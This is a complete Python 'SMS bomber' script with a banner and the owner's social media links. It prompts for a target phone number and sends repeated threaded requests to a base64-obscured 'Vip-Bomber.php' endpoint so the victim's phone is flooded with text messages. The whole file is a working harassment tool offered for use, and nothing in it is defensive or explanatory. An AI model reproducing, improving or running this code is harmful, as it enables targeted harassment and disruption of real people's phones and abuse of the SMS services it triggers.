#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import requests
import threading
import base64
from concurrent.futures import ThreadPoolExecutor

BANNER = r"""
░▒▓████████▓▒░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░       ░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓██████████████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░  
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░       ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░  
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
"""

OWNER_INFO = """
==============================
        Tools Owner Info
==============================
[📘] Facebook Page : https://www.facebook.com/profile.php?id=61564222827738
[📢] Telegram Channel: https://t.me/ERR0R_V4U_Your_Love
"""

RESET_SCREEN = "cls" if os.name == "nt" else "clear"

def clr():
    os.system(RESET_SCREEN)

def banner():
    clr()
    print(BANNER)
    print(OWNER_INFO)
    print("\n")

def format_phone(num):
    return ''.join(filter(str.isdigit, num.strip()))

def input_phone():
    while True:
        cc = input("Enter country code (without +): ").strip()
        cc = format_phone(cc)
        if len(cc) < 1 or not cc.isdigit():
            print("[!] Invalid country code, try again.")
            continue

        target = input(f"Enter target phone number (without country code): ").strip()
        target = format_phone(target)
        if len(target) < 6 or len(target) > 15:
            print("[!] Invalid target phone number length, try again.")
            continue

        return cc, target

def start_bombing(cc, target):
    # Base64 encoded API URL
    encoded_api = "aHR0cHM6Ly9hbG5heWVlbS50b3AvVmlwLUJvbWJlci5waHA/cGhvbmU9"
    base_url = base64.b64decode(encoded_api).decode()
    url = f"{base_url}{cc}{target}"

    total_sms = 10
    delay = 0.5
    threads = 5

    success, failed = 0, 0
    lock = threading.Lock()

    banner()
    print(f"Starting bombing +{cc} {target}")
    print(f"Sending {total_sms} SMS with {threads} threads and {delay} sec delay...\n")
    print("Press CTRL+C to stop.\n")

    def send_request():
        nonlocal success, failed
        try:
            response = requests.get(url, timeout=10)
            with lock:
                if 200 <= response.status_code < 300:
                    success += 1
                    print(f"[+] SMS sent successfully! ({success} success, {failed} failed)")
                else:
                    failed += 1
                    print(f"[-] Failed to send SMS! HTTP Status: {response.status_code} ({success} success, {failed} failed)")
        except requests.RequestException:
            with lock:
                failed += 1
                print(f"[-] SMS send failed ({success} success, {failed} failed)")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for _ in range(total_sms):
            futures.append(executor.submit(send_request))
            time.sleep(delay)

        for future in futures:
            future.result()

    print("\n[+] Bombing done successfully!")
    time.sleep(5)

def main():
    banner()
    cc, target = input_phone()
    try:
        start_bombing(cc, target)
    except KeyboardInterrupt:
        print("\n[!] Bombing stopped by user.")
        sys.exit(0)

if __name__ == "__main__":
    main()
